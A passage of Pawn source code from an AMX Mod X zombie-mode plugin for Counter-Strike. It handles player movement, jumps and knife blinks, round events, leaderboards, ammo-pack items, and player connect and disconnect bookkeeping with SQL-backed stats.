			set_pev ( id, pev_maxspeed, 600.0 );
			
			else
			set_pev ( id, pev_maxspeed, g_fZombieSpeeds[g_iZombieClass[id]]);
		}
		else
		{
			if (  g_iPlayerType[id] & 4 )
			
			set_pev ( id, pev_maxspeed, 230.0 );
			
			else if (  g_iPlayerType[id] & 8 )
			
			set_pev(id, pev_maxspeed, 235.0 );
			
			else						    
				
			set_pev(id, pev_maxspeed, 240.0 );			
		}
	}	
	static Float: CoolDown, Float: CurrentTime;
	
	if ( g_bZombie [id] && g_iPlayerType[id] & 1 )
	{	
		CoolDown = 1.0;
	}
	else return;
	
	CurrentTime = get_gametime (  );
	
	if ( CurrentTime - g_fLastLeapTime [id] < CoolDown ) return;
	
	if ( !g_bFake [id] && !( pev ( id, pev_button ) & ( IN_JUMP | IN_DUCK ) == ( IN_JUMP | IN_DUCK ) ) ) return;

	if ( !( pev ( id, pev_flags ) & FL_ONGROUND ) || fm_get_speed ( id ) < 80 ) return;
	
	static Float: Velocity [3];

	velocity_by_aim ( id, 500, Velocity ) 
	
	Velocity [2] = 300.0;
	
	set_pev ( id, pev_velocity, Velocity );
	
	g_fLastLeapTime [id] = CurrentTime;
}

public OnPreFrame(iPlayer)
{
    if (g_bAlive[iPlayer])
    {
        if (g_bFrozen[iPlayer])
        {
            fm_set_user_maxspeed(iPlayer, 1.0);
        }
      
        if (g_bZombie[iPlayer])
        {
            if (!g_iPlayerType[iPlayer])
            {
                fm_set_user_maxspeed(iPlayer, g_fZombieSpeeds[g_iZombieClass[iPlayer]]);
                fm_set_user_gravity(iPlayer, g_fZombieGravities[g_iZombieClass[iPlayer]]);
            }
            else
            {
                if (g_iPlayerType[iPlayer] & 1)
                {
                    fm_set_user_maxspeed(iPlayer, 250.0);
                    fm_set_user_gravity(iPlayer, 0.5);
                }
                if (g_iPlayerType[iPlayer] & 2)
                {
                    fm_set_user_maxspeed(iPlayer, 600.0);
                    fm_set_user_gravity(iPlayer, 0.33);
                }
            }
        }
        else
        {
            if (!g_iPlayerType[iPlayer])
            {
               fm_set_user_maxspeed(iPlayer, 240.0);
               fm_set_user_gravity(iPlayer, 1.0);
            }
            if (g_iPlayerType[iPlayer] & 4)
            {
               fm_set_user_maxspeed(iPlayer, 250.0);
               fm_set_user_gravity(iPlayer, 1.0);
            }
            if (g_iPlayerType[iPlayer] & 8)
            {
               fm_set_user_maxspeed(iPlayer, 250.0);
               fm_set_user_gravity(iPlayer, 0.8);
            }
        }
    }
    return 0;
}

public OnPlayerJump(iPlayer)
{
    if (g_bAlive[iPlayer])
    {
        new nbut = get_user_button(iPlayer)
        new obut = get_user_oldbutton(iPlayer)
		
        if (g_bZombie[iPlayer] && !g_iPlayerType[iPlayer] && g_iZombieClass[iPlayer] == 3)
        {
            if ((nbut & IN_JUMP) && !(get_entity_flags(iPlayer) & FL_ONGROUND) && !(obut & IN_JUMP) && !g_iJumps[iPlayer])
            {
                new Float:fVelocity[3];
                entity_get_vector(iPlayer, EV_VEC_velocity, fVelocity)
                fVelocity[2] = random_float(265.0, 285.0);
                entity_set_vector(iPlayer, EV_VEC_velocity, fVelocity)
                g_iJumps[iPlayer]++;
            }
            if((nbut & IN_JUMP) && (get_entity_flags(iPlayer) & FL_ONGROUND))
            {
                g_iJumps[iPlayer] = 0;
            }
        }
        if (!g_bZombie[iPlayer] && g_iMaxJumps[iPlayer])
        {
            if ((nbut & IN_JUMP) && !(get_entity_flags(iPlayer) & FL_ONGROUND) && !(obut & IN_JUMP) && g_iJumps[iPlayer] <= g_iMaxJumps[iPlayer] - 1)
            {
                new Float:fVelocity[3];
                entity_get_vector(iPlayer, EV_VEC_velocity, fVelocity)
                fVelocity[2] = random_float(265.0, 285.0);
                entity_set_vector(iPlayer, EV_VEC_velocity, fVelocity)
                g_iJumps[iPlayer]++;
            }
            if((nbut & IN_JUMP) && (get_entity_flags(iPlayer) & FL_ONGROUND))
            {
                g_iJumps[iPlayer] = 0;
            }
        }
    }
    return 0;
}

public client_PreThink ( id )
{
	if ( g_bAlive [id] )
	{
		new Button = get_user_button ( id );
		
		new Float: FallSpeed = 50.0 * -1.0;
			
		if ( Button & IN_USE ) 
		{
			new Float: Velocity [3];
		
			entity_get_vector ( id, EV_VEC_velocity, Velocity );
		
			if ( Velocity [2] < 0.0 ) 
			{
				entity_set_int ( id, EV_INT_sequence, 3 );
			
				entity_set_int ( id, EV_INT_gaitsequence, 1 );
			
				entity_set_float ( id, EV_FL_frame, 1.0 );
					
				entity_set_float ( id, EV_FL_framerate, 1.0 );

				Velocity [2] = ( Velocity [2] + 40.0 < FallSpeed ) ? Velocity [2] + 40.0 : FallSpeed;
		
				entity_set_vector ( id, EV_VEC_velocity, Velocity );
			}
	    }
	}
}

public PlayerPreThink ( id )
{
	if ( g_bAlive [id] )
	{
		if (!g_bZombie [id])
		{	
	        if (g_vip[id] && g_bAlive[id]&&containi(g_vip_flags[id], "j")!=-1)
	        {
	            new nbut = get_user_button(id)
	            new obut = get_user_oldbutton(id)
	            if((nbut & IN_JUMP) && !(get_entity_flags(id) & FL_ONGROUND) && !(obut & IN_JUMP))
	            {
			        if(jumpnum[id] < 1)
			        {
				        dojump[id] = true
				        jumpnum[id]++
			        }
	            }
	            if((nbut & IN_JUMP) && (get_entity_flags(id) & FL_ONGROUND))
	            {
			        jumpnum[id] = 0
	            }
	        }
		}			
	}
}

public OnPlayerSpawn(iPlayer)
{
	if (is_user_alive(iPlayer))
	{
        g_bAlive[iPlayer] = true;
        g_iPlayerType[iPlayer] = 0;
        cs_reset_user_model(iPlayer)
        g_cClass[iPlayer] = "Human"
        g_bFlashEnabled[iPlayer] = false;
        g_bDoubleDamage[iPlayer] = false;
        g_bKilling[iPlayer] = false;
        g_bFlash[iPlayer] = false;		
        g_bZombie[iPlayer] = false;
        g_bNoDamage[iPlayer] = false;
        g_bFrozen[iPlayer] = false;
        g_iBurningDuration[iPlayer] = 0;
        fm_set_user_health ( iPlayer, 150 );
        set_pev(iPlayer, pev_gravity, 1.0 );
        remove_task(iPlayer + 250);
        remove_task(iPlayer + 200, 0);
        remove_task(iPlayer + 350, 0);
        set_task(0.4, "task_hide_money", iPlayer+TASK_SPAWN);
        fm_set_rendering ( iPlayer, kRenderFxGlowShell, 0, 0, 0, kRenderNormal, 0 );			
        set_task(0.20, "TaskShowMenu", iPlayer, "", 0, "", 0);
        set_task(random_float(1.0, 5.0), "TaskRespawn", iPlayer, "", 0, "", 0);
        if (!g_bRoundStart)
        {
            if (g_iRoundType & 4 || g_iRoundType & 8 || g_iRoundType & 64 || g_iRoundType & 32)
            {
                MakeZombie(0, iPlayer, false, false, false);
            }
            if (!g_iRoundType || g_iRoundType & 1 || g_iRoundType & 2)
            {
				if (fm_cs_get_user_team(iPlayer) != FM_CS_TEAM_CT)
                {
                    remove_task ( iPlayer + TASK_TEAM );
		
                    fm_cs_set_user_team ( iPlayer, FM_CS_TEAM_CT );
		
                    fm_user_team_update ( iPlayer );
				}
            }	   
            if (g_iRoundType & 128 || g_iRoundType & 256)
            {
                MakeHuman(iPlayer, true, false);
            }
            if (g_iRoundType & 512)
            {
                MakeZombie(0, iPlayer, false, false, true);
            }
        }
        static Float:fCurrentTime;
        fCurrentTime = get_gametime();
        if (floatsub(fCurrentTime, g_fLastChangedModel) >= 0.35)
        {
            ChangeModel(iPlayer + 250);
            g_fLastChangedModel = fCurrentTime;
        }
        else
        {
            set_task(floatsub(floatadd(0.35, g_fLastChangedModel), fCurrentTime), "ChangeModel", iPlayer + 250, "", 0, "", 0);
            g_fLastChangedModel = floatadd(0.35, g_fLastChangedModel);
        }			
	}
	return 0;	
}

public TaskRespawn(iPlayer)
{
	if (g_bConnected[iPlayer] && FM_CS_TEAM_UNASSIGNED < fm_cs_get_user_team(iPlayer) < FM_CS_TEAM_SPECTATOR)
	{
		if (!g_bAlive[iPlayer])
		{
			ExecuteHamB(Ham_CS_RoundRespawn, iPlayer);
			set_task(1.50, "TaskRespawn", iPlayer, "", 0, "", 0);
		}
		set_pev(iPlayer, pev_effects, pev(iPlayer, pev_effects) &~ EF_BRIGHTLIGHT)
		set_pev(iPlayer, pev_effects, pev(iPlayer, pev_effects) &~ EF_NODRAW)
	}
	return 0;
}

public EventRoundEnd()
{
	static Float:fCurrent;
	static Float:fLast;
	fCurrent = get_gametime();
	if (fCurrent - fLast < 0.50)
	{
		return 0;
	}
	fLast = fCurrent;
	g_iRoundsCount += 1;
	g_roundend = 1
	g_iRounds[g_iRoundsCount] = g_iRoundType;
	g_bRoundEnd = true;
	g_bModeStarted = false;
	g_iRoundType = 0;
	remove_task(600, 0);
	remove_task(700, 0);
	remove_task(550, 0);
	remove_task(900, 0);
	remove_task(650, 0);
	client_cmd(0, "stopsound");
	if (!GetZombies())
	{
		set_hudmessage(0, 0, 200, -1.00, 0.17, 0, 0.00, 3.00, 2.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "Humans have defeated the plague!");
		client_cmd(0, "spk %s", g_cEndRoundHumanSounds[random_num(0, 2)]);
	}
	else if (!GetHumans())
	{
        set_hudmessage(200, 0, 0, -1.00, 0.17, 0, 0.00, 3.00, 2.00, 1.00, -1);
        ShowSyncHudMsg(0, g_iTopMessageSync, "Zombies have taken over the world!");
        client_cmd(0, "spk %s", g_cEndRoundZombieSounds[random_num(0, 3)]);
	}
	else 
	{	
		set_hudmessage(0, 200, 0, -1.00, 0.17, 0, 0.00, 3.00, 2.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "No one won...");
		client_cmd(0, "spk ZombieOutstanding/end_round_win_no_one");
	}
	static iFrags;
	static iMaximumPacks;
	static iMaximumKills;
	static iPacksLeader;
	static iKillsLeader;
	iMaximumPacks = 0;
	iMaximumKills = 0;
	iPacksLeader = 0;
	iKillsLeader = 0;
	g_iVariable = 1;
	while (g_iMaxClients + 1 > g_iVariable)
	{
		if (g_bConnected[g_iVariable])
		{
			iFrags = get_user_frags(g_iVariable);
			if (iFrags > iMaximumKills)
			{
				iMaximumKills = iFrags;
				iKillsLeader = g_iVariable;
			}
		}
		g_iVariable += 1;
	}
	g_iVariable = 1;
	while (g_iMaxClients + 1 > g_iVariable)
	{
		if (g_bConnected[g_iVariable] && g_iPacks[g_iVariable] > iMaximumPacks)
		{
			iMaximumPacks = g_iPacks[g_iVariable];
			iPacksLeader = g_iVariable;
		}
		g_iVariable += 1;
	}
	if (g_bConnected[iKillsLeader])
	{
		static a[15];
		AddCommas(iMaximumKills, a, 14);
		if (g_iKillsThisRound[iKillsLeader])
		{
			client_print_color(0, print_team_grey, "^3%s^1 is^4 Leader^1 with^4 %s^1 frags! [^4 %d^1 this round ]", g_cName[iKillsLeader], a, g_iKillsThisRound[iKillsLeader]);
		}
		else
		{
			client_print_color(0, print_team_grey, "^3%s^1 is^4 Leader^1 with^4 %s^1 frags!", g_cName[iKillsLeader], a);
		}
	}
	if (g_bConnected[iPacksLeader])
	{
		static a[15];
		AddCommas(iMaximumPacks, a, 14);
		
		client_print_color(0, print_team_grey, "^3%s^1 is^4 Leader^1 with^4 %s^1 packs!", g_cName[iPacksLeader], a);
	}
	set_lights ( "d" );
	BalanceTeams (  );
	return 0;
}

public EventRoundStart()
{
    g_iRoundType = 0;
    g_roundend = 0
    g_bRoundEnd = false;
    g_bRoundStart = true;
    g_bModeStarted = false;
    FreezeTime = false;
    remove_task(650, 0);
    set_task(2.0, "TaskWelcome", 650, "", 0, "", 0);
    set_hudmessage(0, 125, 200, -1.00, 0.17, 1, 0.00, 3.00, 2.00, 1.00, -1);
    ShowSyncHudMsg(0, g_iTopMessageSync, "The T-Virus has been set loose...");
    g_iCounter = 16;
    remove_task(550, 0);
    set_task(16.0, "TaskZombie", 550, "", 0, "", 0);
    remove_task(700, 0);
    set_task(1.0, "TaskCounter", 700, "", 0, "a", 15);
    static i;
    i = 1;
    while (g_iMaxClients + 1 > i)
    {
        if (g_bConnected[i] && get_user_jetpack(i))
        {
            set_user_rocket_time(i, 0.0);
        }		
        g_iMaxJumps[i] = 0;
        g_bDoubleDamage[i] = false;
        g_bTryder[i] = false;
        g_iBlinks[i] = 0;
        g_iKillsThisRound[i] = 0;
        g_bGaveThisRound[i] = false;
        g_bUnlimitedClip[i] = 0;		
        i += 1;
    }	
    return 0;
}

public cmdPlugins(id)
{
	if( ~ get_user_flags( id ) & read_flags ("a"))
	{
		client_print( id, print_console, "Zombie Outstanding  No Access to this command!s");
		return PLUGIN_HANDLED;
	}
	
	if( id == 0 ) 
	{
		server_cmd( "amxx plugins" );
		server_exec( );
		
		return PLUGIN_HANDLED;
	}

	new szName[ 64 ], szVersion[ 8 ], szAuthor[ 32 ], szFileName[ 64 ], szStatus[ 32 ];
	new iStartId, iEndId;

	new szTemp[ 128 ];

	new iNum = get_pluginsnum( );
	
	if( read_argc( ) > 1 )
	{
		read_argv( 1, szTemp, charsmax( szTemp ) );
		iStartId = str_to_num( szTemp ) - 1;
	}

	iEndId = min( iStartId + 10, iNum );
	
	new iRunning;
	
	console_print( id, "Currently loaded plugins" );
	
	new i = iStartId;
	
	while( i < iEndId )
	{
		get_plugin( i++, szFileName, charsmax( szFileName ), szName, charsmax( szName ), szVersion, charsmax( szVersion ), szAuthor, charsmax( szAuthor ), szStatus, charsmax( szStatus ) );
		console_print( id, "%-18.17s %-11.10s %-17.16s %-16.15s %-9.8s", szName, szVersion, szAuthor, szFileName, szStatus );
		
		if( szStatus[ 0 ] == 'd' || szStatus[ 0 ]=='r')
		{
			iRunning++;
		}
	}
	console_print(id, "%d plugins, %d running", iEndId-iStartId, iRunning );
	console_print(id, "----- Entries %d - %d of %d -----", iStartId + 1, iEndId, iNum );
	
	if( iEndId < iNum )
	{
		formatex( szTemp, charsmax( szTemp ),"----- Use 'amx_help %d' for more -----", iEndId + 1);
		replace_all( szTemp, charsmax( szTemp ), "amx_help", "amx_plugins" );
		console_print( id, "%s", szTemp );
	}
	
	else
	{
		formatex( szTemp, charsmax( szTemp ),"----- Use 'amx_help 1' for begin -----" );
		replace_all( szTemp, charsmax( szTemp ), "amx_help", "amx_plugins" );
		console_print( id, "%s", szTemp );
	}

	return PLUGIN_HANDLED;
}

public Event_RoundStart()
{
	static iEntity, szClassName[ 32 ], iPlayer;
	for( iEntity = 0; iEntity < 600 + 1; iEntity++ ) 
	{
		if( !is_valid_ent( iEntity ) )
		continue;
		
		szClassName[ 0 ] = '^0';
		entity_get_string( iEntity, EV_SZ_classname, szClassName, 31);
		
		if( equal( szClassName, "zp_trip_mine" ) )
		remove_entity( iEntity );
	}
	
	for( iPlayer = 1; iPlayer < 33; iPlayer++ ) 
	{
		g_iTripMines[ iPlayer ] = 0;
		g_iPlantedMines[ iPlayer ] = 0;
	}
}

public TaskWelcome()
{
    client_print_color(0, print_team_grey, "^1****^4 Zombie Outstanding V2.0^1 by^3 SideWinder^1 ||^4 Nume.Server.Ro^1 ****");
    client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 Press^4 M^1 to open the game menu!");
    return 0;
}

public TaskZombie()
{
	if ((g_iAliveCount = GetAliveCount()))
	{
		g_bRoundStart = false;
		if (g_iRoundsCount > 3)
		{
			StartSwarmMode(false);
		}
		else
		{
			StartNormalMode(0);
		}
	}
	else
	{
		set_task(6.0, "TaskZombie", 550, "", 0, "", 0);
	}
	return 0;
}

public TaskAmbience()
{
    if (g_iRoundType & 4)
    {
        client_cmd(0, "spk ZombieOutstanding/ambience_survivor");
    }
    else
    {
        client_cmd(0, "spk ZombieOutstanding/ambience_normal");
    }
    return 0;
}

public TaskCounter()
{
	g_iCounter -= 1;
	if (0 < g_iCounter < 9)
	{
		static cWord[12];
		num_to_word(g_iCounter, cWord, 12);
		set_hudmessage(179, 0, 0, -1.00, 0.28, 2, 0.02, 1.00, 0.01, 0.10, 10);
		ShowSyncHudMsg(0, g_iCounterMessage, "Infection in %d", g_iCounter);
		client_cmd(0, "spk fvox/%s", cWord);
	}
	return 0;
}

public EventHLTV()
{
    g_bRoundStart = true;
    g_bModeStarted = false;
    g_fRoundStartTime = get_gametime();
    for(new id = 1; id <= g_iMaxClients; id++)
    {
        if(is_user_connected(id)) 
		{
		    g_bKilling[id] = false
		    g_bUnlimitedClip[id] = false;
		    g_iBlinks[id] = 0;
		}
    }   	
    return 0;
}

public FW_TraceLine_Post(Float:start[3], Float:end[3], conditions, id, trace)
{
	if (!CHECK_ValidPlayer(id))
		return FMRES_IGNORED;
	
	new iWeaponID = get_user_weapon(id);
	
	if ( iWeaponID != CSW_KNIFE )
	{
		OP_Cancel(id);
		return FMRES_IGNORED;
	}
	
	new enemy = g_iEnemy[id];
	
	if (!enemy){
		
		enemy = get_tr2(trace, TR_pHit);
		
		if ( !CHECK_ValidPlayer(enemy) || g_bZombie[enemy] )
		{
			
			OP_Cancel(id);
			return FMRES_IGNORED;
		}
		
		g_iEnemy[id] = enemy;
	}
	
	return FMRES_IGNORED;
}

public fwClientKill (  ) return FMRES_SUPERCEDE;

public FW_PlayerPreThink(id)
{
	if (!CHECK_ValidPlayer(id))
		return FMRES_IGNORED;
	
	new iWeaponID = get_user_weapon(id);
	
	if ( iWeaponID != CSW_KNIFE || !g_bZombie[id] )
	{
		
		OP_Cancel(id);
		return FMRES_IGNORED;
	}
	
	if ( g_iBlinks[id] == 0 )
		return FMRES_IGNORED;
	
	new button = pev(id,pev_button);
	
	if ( !(button & IN_ATTACK) && !(button & IN_ATTACK2) )
	{
		
		OP_Cancel(id)
		return FMRES_IGNORED;
	}
	
	if (g_iSlash[id])
		g_iSlash[id] = 0;
	
	OP_NearEnemy(id);
	
	if( g_iInBlink[id] )
	{
		
		OP_SetBlink(id);
		OP_Blink(id);
		g_iCanceled[id] = 0;
	}

	return FMRES_IGNORED;
}

public OP_NearEnemy(id)
{
	new enemy = g_iEnemy[id];
	new Float:time = get_gametime();
	
	if (!enemy || g_fLastSlash[id]+1.0>time)
	{
		
		g_iInBlink[id] = 0;
		return;
	}
	
	new origin[3], origin_enemy[3];
	
	get_user_origin(id, origin, 0);
	get_user_origin(enemy, origin_enemy, 0);
	
	new distance = get_distance(origin, origin_enemy);
	
	if ( 50.0<=distance<=300.0)
	{
		
		g_iInBlink[id] = 1;
		return;
		
	}else if (50.0>distance && g_iInBlink[id])
	{
		OP_Slash(id);
	}
	OP_Cancel(id);
}

public OP_Blink(id)
{
	new Float:new_velocity[3];
	new enemy = g_iEnemy[id];
	new Float:origin_enemy[3];
	
	pev(enemy, pev_origin, origin_enemy);
	entity_set_aim(id, origin_enemy);
	
	get_speed_vector2(id, enemy, 1000.0, new_velocity)
	set_pev(id, pev_velocity, new_velocity);
}

public OP_Cancel(id)
{
	g_iInBlink[id] = 0;
	g_iEnemy[id] = 0;
	if (!g_iCanceled[id])
	{
		OP_SetBlink(id);
		g_iCanceled[id] = 1;
	}
}

public OP_Slash(id)
{
	set_pev(id, pev_velocity, {0.0,0.0,0.0});
	
	new weaponID = get_user_weapon(id, _, _);
	
	if(weaponID == CSW_KNIFE)
	{
		new weapon[32]
		
		get_weaponname(weaponID,weapon,31)
		
		new ent = fm_find_ent_by_owner(-1,weapon,id)
		
		if(ent)
		{
			set_pdata_float(ent,46, 0.0);
			set_pdata_float(ent,47, 0.0);
			g_iSlash[id] = 1;
			g_fLastSlash[id] = get_gametime();
			g_iBlinks[id] -= 1;
			new name[32];
			get_user_name(id,name,31)
			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 just used a^4 Knife Blink^1 [^4 %d remaining^1 ]", g_cName[id], g_iBlinks[id]);
		}
	}  
}

public OP_SetBlink(id)
{
	new blink = g_iInBlink[id];
	
	if (blink>1)
		return;
	
	if (blink)
	g_iInBlink[id] += 1;
}

public client_putinserver(iPlayer)
{
	static iSize;
	static queryData[32] = { 0, ... };
	g_bKilling[iPlayer] = false;
	g_bRanked[iPlayer] = false;
	g_bAlive[iPlayer] = false;
	g_bNoDamage[iPlayer] = false;
	g_bZombie[iPlayer] = false;
	g_iPlayerType[iPlayer] = false;
	g_bGoldenDeagle[iPlayer] = false;
	g_bGolden[iPlayer] = false;	
	g_bGaveThisRound[iPlayer] = false;
	g_iBurningDuration[iPlayer] = 0;
	g_iKillsThisRound[iPlayer] = 0;
	g_iPacks[iPlayer] = 0;
	g_iZombieNextClass[iPlayer] = -1;
	TaskReward[iPlayer] = 600;
	g_bConnected[iPlayer] = true;
	get_user_ip(iPlayer, g_cPlayerAddress[iPlayer], 24, 1);
	get_user_name(iPlayer, g_cName[iPlayer], 31);
	savePoints(iPlayer)
	if (!g_bFake[iPlayer])
	{
		set_task(1.0, "TaskHud", iPlayer + 300, "", 0, "b", 0);
		set_task(12.0, "TaskCheckName", iPlayer, "", 0, "", 0);
        new Country[ 128 ], CityString[ 128 ];
		GetClientGeoData( iPlayer, CountryName, Country, 127 );
		GetClientGeoData( iPlayer, City, CityString, 127 );
        client_print_color(0, print_team_grey, "^1Player^4 %s^1 connected from [^3%s^1] [^3%s^1]", g_cName[iPlayer], Country, CityString );	
	}
	
	set_task(2.0, "Administrator", iPlayer)
	client_cmd(iPlayer, "cl_minmodels 0; mp3 stop");
	if ((iSize = ArraySize(g_aAmmoData)))
	{
		static cSavedName[32];
		static i;
		i = iSize + -1;
		while (i > -1)
		{
			ArrayGetString(g_aNameData, i, cSavedName, 32);
			if (equali(cSavedName, g_cName[iPlayer], 0))
			{
				g_iPacks[iPlayer] = ArrayGetCell(g_aAmmoData, i);
			}
			i -= 1;
		}
	}
	if (!g_iPacks[iPlayer])
	{
		g_iPacks[iPlayer] = 5;
	}
	
	if (isValidPlayer(iPlayer) && is_user_bot(iPlayer) == 0 && is_user_hltv(iPlayer) == 0)
	{
		resetPlayer(iPlayer);

		num_to_str(iPlayer, queryData, charsmax(queryData));

		get_user_name(iPlayer, g_Name[iPlayer], charsmax(g_Name[]));
		replace_all(g_Name[iPlayer], charsmax(g_Name[]), "`", "*");
		replace_all(g_Name[iPlayer], charsmax(g_Name[]), "'", "*");
		replace_all(g_Name[iPlayer], charsmax(g_Name[]), "\", "*");

		get_user_authid(iPlayer, g_Steam[iPlayer], charsmax(g_Steam[]));
		get_user_ip(iPlayer, g_Ip[iPlayer], charsmax(g_Ip[]), 1);

		formatex(g_Query, charsmax(g_Query), "SELECT Score, Kills, Deaths, headShots, Time, timeString, \
		Seen, seenString, kpdRatio, kmdValue FROM Players WHERE Name = '%s';", g_Name[iPlayer]);

		SQL_ThreadQuery(g_Tuple, "retrieveOrCreatePlayer", g_Query, queryData, sizeof(queryData));
	}	
} 

public Administrator(id)
{
	if (get_user_flags ( id ) & read_flags ( "r" ) )
	{
		set_dhudmessage(157, 103, 200, 0.02, 0.64, 2, 6.0, 3.0);
		show_dhudmessage(id, "You are now Administrator!");
		console_print(id,"You are now administrator.");
	}
}

public client_disconnect(iPlayer)
{
	static iTimeLimit;
	iTimeLimit = get_pcvar_num(g_iTimeLimit);
	if (iTimeLimit != 4096)
	{
		if (g_bAlive[iPlayer])
		{
			CheckLastPlayer(iPlayer);
		}
		InsertInfo(iPlayer);
		ArrayPushString(g_aNameData, g_cName[iPlayer]);
		ArrayPushCell(g_aAmmoData, g_iPacks[iPlayer]);
	}	
	remove_task(iPlayer + TASK_TEAM);
	remove_task(iPlayer + 50, 0);
	remove_task(iPlayer + 100, 0);
	remove_task(iPlayer + 150, 0);
	remove_task(iPlayer + 250, 0);
	remove_task(iPlayer + 200, 0);
	remove_task(iPlayer + 300, 0);
	remove_task(iPlayer + 850, 0);
	remove_task(iPlayer + 350, 0);
	remove_task(iPlayer + 400, 0);
	remove_task(iPlayer + 500, 0);
	remove_task(iPlayer + 450, 0);
	if (g_iPlantedMines[iPlayer])
	{
		Func_RemoveMinesByOwner(iPlayer);
		g_iPoints[iPlayer] = 0;
		g_iPlantedMines[iPlayer] = 0;
	}	
	g_iTripMines[iPlayer] = 0;
	g_fGagTime[iPlayer] = false;
	g_iPlanting[iPlayer] = false;
	g_iRemoving[iPlayer] = false;	
	g_bAlive[iPlayer] = false;
	g_vip[iPlayer] = false 
	g_bConnected[iPlayer] = false;
	g_bServerSlot[iPlayer] = false;
	g_bAdminModel[iPlayer] = false;
	g_bDoubleDamage[iPlayer] = false;
	g_bTryder[iPlayer] = false;
	jumpnum[iPlayer] = 0
	dojump[iPlayer] = false	
	savePoints(iPlayer)
	g_iBlinks[iPlayer] = 0;
	g_bUnlimitedClip[iPlayer] = 0;
	g_iPingOverride[ iPlayer ] = -1;
	if (isValidPlayer(iPlayer) && is_user_bot(iPlayer) == 0 && is_user_hltv(iPlayer) == 0)
	{
		resetPlayer(iPlayer);
		if (task_exists(iPlayer + 400))
		{
			remove_task(iPlayer + 400);
		}
	}
	if (g_bFake[iPlayer])
	{
		g_bFake[iPlayer] = false;
	}	
	return 0;	
}

public fw_UpdateClientData( id )
{
	if( !(pev( id, pev_button ) & IN_SCORE ) && !( pev( id, pev_oldbuttons ) & IN_SCORE ) )
		return;
	
	static player, sending;
	sending = 0;
	
	for( player = 1; player <= g_iMaxClients; player++ )
	{
		if( !is_user_connected( player ) )
			 continue;
		
		switch( sending )
		{
			case 0:
			{
				message_begin( MSG_ONE_UNRELIABLE, SVC_PINGS, _, id );
				write_byte( ( g_iOffset[ player ][ 0 ] * 64 ) + ( 1 + 2 * ( player - 1 ) ) );
				write_short( g_iArgumentPing[ player ][ 0 ] );
				sending++;
			}
			
			case 1:
			{
				write_byte( ( g_iOffset[ player ][ 1 ] * 128 ) + ( 2 + 4 * ( player - 1 ) ) );
				write_short( g_iArgumentPing[ player ][ 1 ] );
				sending++;
			}
			
			case 2:
			{
				write_byte( ( 4 + 8 * ( player - 1 ) ) );
				write_short( g_iArgumentPing[ player ][ 2 ] );
				write_byte( 0 );
				message_end( );
				sending = 0;
			}
		}
	}
	
	if (sending)
	{
		write_byte( 0 );
		message_end( );
	}
}

public calculate_arguments( )
{
	static player, ping;
	
	for( player = 1; player <= g_iMaxClients; player++ )
	{
		if( g_iPingOverride[ player ] < 0 )
			ping = clamp( g_iPing + random_num( -g_iFlux, g_iFlux ), 0, 4095 );
		
		else
			ping = g_iPingOverride[ player ];
		
		for( g_iOffset[ player ][ 0 ] = 0; g_iOffset[ player ][ 0 ] < 4; g_iOffset[ player ][ 0 ]++ )
		{
			if( ( ping - g_iOffset[ player ][ 0 ] ) % 4 == 0 )
			{
				g_iArgumentPing[ player ][ 0 ] = ( ping - g_iOffset[ player ][ 0 ] ) / 4;
				break;
			}
		}
		
		for (g_iOffset[player][1] = 0; g_iOffset[player][1] < 2; g_iOffset[player][1]++)
		{
			if( ( ping - g_iOffset[ player ][ 1 ] ) % 2 == 0 )
			{
				g_iArgumentPing[ player ][ 1 ] = ( ping - g_iOffset[ player ][ 1 ] ) / 2;
				break;
			}
		}
		
		g_iArgumentPing[ player ][ 2 ] = ping;
	}
}

public client_PostThink(id)
{
	if(!g_bAlive[id] || !g_vip[id] || containi(g_vip_flags[id], "j") == -1)
		return

	if(dojump[id] == true)
	{
		new Float:velocity[3]	
		entity_get_vector(id,EV_VEC_velocity,velocity)
		velocity[2] = random_float(265.0, 285.0)
		entity_set_vector(id,EV_VEC_velocity,velocity)
		dojump[id] = false
	}
}


public _ZombieClasses(iPlayer, iMenu, iItem)
{
    if (iItem != -3 && !g_bFake[iPlayer] && g_bConnected[iPlayer])
    {
        static iChoice;
        static iDummy;
        static cBuffer[15];
        menu_item_getinfo(iMenu,iItem, iDummy, cBuffer, charsmax ( cBuffer ), _, _, iDummy );
        iChoice = str_to_num(cBuffer);
        g_iZombieNextClass[iPlayer] = iChoice;
        AddCommas(g_iZombieHealths[iChoice], cBuffer, 14);
        client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You will be^4 %s^1 after the next infection!", g_cZombieClasses[iChoice]);
        client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Health:^4 %s^1 | Speed:^4 %0.0f^1 | Gravity:^4 %0.0f^1 | Knockback:^4 %0.0f%s", cBuffer, g_fZombieSpeeds[iChoice], floatmul(100.0, g_fZombieGravities[iChoice]), floatmul(100.0, g_fZombieKnockbacks[iChoice]), "%");
    }
    return 0;
}

public _ExtraItems(iPlayer, iMenu, iItem)
{
	if (g_bAlive[iPlayer] && iItem != -3 && !g_iPlayerType[iPlayer])
	{
		static iChoice;
		static iDummy;
		static cBuffer[3];
		menu_item_getinfo(iMenu, iItem, iDummy, cBuffer, charsmax ( cBuffer ), _, _, iDummy );
		iChoice = str_to_num(cBuffer);
		switch (iChoice)
		{
			case 0:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				if (g_iRoundType & 4 || g_iRoundType & 8 || g_iRoundType & 256 || g_iRoundType & 512 || g_iRoundType & 128 || g_iRoundType & 1 || g_iRoundType & 2 || g_iRoundType & 32 || g_iRoundType & 64 || g_bRoundEnd || GetZombies() == 1 || !GetHumans())
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You can't buy this item right now!");
					return 0;
				}
				MakeHuman(iPlayer, false, false);
				g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
			}
			case 1:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
